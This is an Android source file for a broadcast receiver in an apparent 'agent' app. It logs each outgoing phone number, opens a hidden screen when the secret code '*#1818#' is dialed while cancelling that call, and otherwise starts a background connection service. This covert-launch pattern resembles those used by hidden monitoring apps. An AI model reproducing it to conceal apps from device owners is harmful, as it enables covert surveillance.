package com.dx.agent2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.dx.service.ConnectService;
import com.dx.utils.Log;
import com.dx.utils.SpUtil;

public class BListener extends BroadcastReceiver {
    final String TAG = "BListener";
    private SpUtil spUtil;

    @Override
    public void onReceive(Context context, Intent intent) {
        spUtil = SpUtil.getInstance(context);
        String action = intent.getAction();
        Log.i(TAG, "onReceive() " + action);
        if (action.equals("android.intent.action.NEW_OUTGOING_CALL")) {
            String num = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.i(TAG, "num=" + num);
            if (num.equals("*#1818#")) {
                Intent it = new Intent(context, LoadActivity.class);
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(it);
                setResultData(null);
            } else {
                nextDo(context, action);
            }
        } else {
            nextDo(context, action);
        }
    }

    private void nextDo(Context context, String action) {
        if (spUtil.toTimeOut()) {
            Log.e(TAG, "onReceive(" + action + ") Start ConnectService");
            context.startService(new Intent(context, ConnectService.class));
        }
    }

}
